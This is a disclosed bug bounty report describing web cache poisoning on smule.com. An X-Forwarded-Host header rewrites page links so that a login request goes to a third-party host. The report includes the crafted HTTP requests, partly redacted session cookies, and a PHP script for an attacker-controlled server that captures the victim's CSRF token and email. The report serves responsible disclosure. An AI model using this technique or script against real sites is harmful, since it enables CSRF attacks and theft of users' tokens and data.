# Web cache poisoning leads to disclosure of CSRF token and sensitive information

## Report Details
- **Report ID**: 504514
- **URL**: https://hackerone.com/reports/504514
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-03-03T17:17:52.679Z
- **Disclosed**: 2019-07-21T06:17:59.380Z

## Reporter
- **Username**: d3f4u17
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: smule

## Vulnerability Information
**Summary:** 

The page [https://www.smule.com/s/smule_groups/user_groups/user_name](https://www.smule.com/s/smule_groups/user_groups/fossnow27) is vulnerable to web cache poisoning.

**Description:**

The page [https://www.smule.com/s/smule_groups/user_groups/user_name](https://www.smule.com/s/smule_groups/user_groups/fossnow27) is vulnerable to web cache poisoning, on adding `X-Forwarded-Host` header to the request multiple request links get change which leads a user to make requests to a third party website.

## Steps To Reproduce:

*  Intercept the request to the following page [https://www.smule.com/s/smule_groups/user_groups/user_name](https://www.smule.com/s/smule_groups/user_groups/fossnow27) using burp suite or any other tool.

```
GET /s/smule_groups/user_groups/fossnow27 HTTP/1.1
Host: www.smule.com
X-Forwarded-Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: smule_id_production=████%3D%3D--a559b392c9fc10711c799307af296a387ec77794; smule_cookie_banner_disabled=true; _ga=GA1.2.1744768224.1551586925; _gid=GA1.2.2071077738.1551586925; L=N; _smule_web_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiJTY4Nzc0ZDQxYjdiYmEyYTlmNmRkZTk3NjYwYmRlMDBkBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWhmSkdDZk9XcGhHajc5dXFHd1FYc1NhUnh0eGtjVHBocG1Sb3RubldlNDg9BjsARg%3D%3D--4ea860dfb2e3ad2a5a3d49c058f35485961ac5d3; cookies.js=1; smule_autoplay={%22enabled%22:true}; py={%22globalVolume%22:true%2C%22volume%22:0.5}; connection_info=eyJjb3VudHJ5IjoiSU4iLCJob21lUG9wIjoic2ciLCJjb250ZW50UHJveHkiOiJ0YyJ9--16206c9d48aa7c70227255756cc5a9e1e43d3cab
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"74107fb6dcc410390f339e5ddabc3022"
Cache-Control: max-age=0

```
In the above request I have added X-Forwarded-Host header.

* The response returned is shown below, changing the action links as well as footer links of the page.
{F434734}

*  Now open the response, and try to login, when you will login following request will be made
> If you will refresh the page it will ask for resubmission as it is a type of revalidate type of caching.

```
POST /user/check_email HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.smule.com/s/smule_groups/user_groups/fossnow27
X-CSRF-Token: █████████=
Content-Type: application/x-www-form-urlencoded
X-Smulen: daf446d26def7faeef4f6527d7f20fae
Content-Length: 31
Origin: https://www.smule.com
Connection: close

email=foo%40bar.com	
```
to mimic the reponse of the actual server response I have written the following script

```php
<?php
if($_SERVER['REQUEST_METHOD'] == "OPTIONS"){
    if($_SERVER['HTTP_ORIGIN'] == "https://www.smule.com"){
        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
        header('Access-Control-Allow-Headers: x-csrf-token,x-smulen');
        header('Access-Control-Max-Age: 1728000');
        header("Content-Length: 0");
        header("Content-Type: text/plain");
        exit;
    }
    else{
        header("HTTP/1.1 403 Access Forbidden");
        header("Content-Type: text/plain");
        echo "You cannot repeat this request";
    }
}

else if($_SERVER["REQUEST_METHOD"] == "POST"){
	header("Content-type: application/json; charset=utf-8");
	header("Cache-Control: max-age=0, private, must-revalidate");
	header("Content-Security-Policy: default-src * data: blob:; frame-ancestors *.smule.com; script-src 'unsafe-inline' 'unsafe-eval' blob: https://boards.greenhouse.io/embed/job_board/js https://js.stripe.com/v2/ https://js.stripe.com/v3/ http://*.smule.com:* http://*.facebook.net http://*.google-analytics.com http://*.google.com http://*.googleapis.com http://*.gstatic.com https://*.smule.com:* https://*.facebook.net https://*.accountkit.com https://*.google-analytics.com https://*.google.com https://*.googleapis.com https://*.gstatic.com http://www.apple.com/library/quicktime/scripts/ac_quicktime.js https://www.apple.com/library/quicktime/scripts/ac_quicktime.js platform.twitter.com https://optimize.google.com; style-src 'unsafe-inline' data: http://*.smule.com:* https://*.smule.com:* yui.yahooapis.com https://optimize.google.com https://fonts.googleapis.com; report-uri /s/csp-log;");
	header("X-Frame-Options: SAMEORIGIN");
	header("Set-Cookie: smule_id_production=████%3D%3D--a559b392c9fc10711c799307af296a387ec77794;domain=.smule.com; path=/; expires=Fri, 01-Jan-2038 08:00:00 GMT");
	header("ETag: W/\"5be24db7cb9adabbe965c1850ce0de98\"");
	header("X-Request-Id: 9c67b0a57e77660dacbefea12085f82f");
	$res = array("email"=>true, "token" => $_SERVER["HTTP_X_CSRF_TOKEN"], "mail" => $_POST['email']);
	echo json_encode($res);
}
?>
```
The request/respone is shown below:

{F434739}

## Impact:

* CSRF attacks.
* Sensitive Information leakage. 

## Supporting Material/References:

* [https://www.owasp.org/index.php/Cache_Poisoning](https://www.owasp.org/index.php/Cache_Poisoning)
* [https://portswigger.net/blog/practical-web-cache-poisoning](https://portswigger.net/blog/practical-web-cache-poisoning)

## Impact

* CSRF attacks
* Information disclosure

## Attachments
- smulewebcache.png
- smulewebcache3.png
